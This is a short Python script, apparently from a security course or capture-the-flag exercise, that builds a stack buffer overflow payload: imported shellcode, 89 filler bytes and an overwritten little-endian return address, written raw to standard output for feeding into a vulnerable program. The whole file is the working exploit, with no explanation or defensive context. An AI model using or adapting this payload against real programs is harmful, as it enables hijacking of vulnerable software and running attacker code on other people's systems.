from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode + ('\x12'*89).encode('ASCII') + pack("<I", 0xfffe97bc))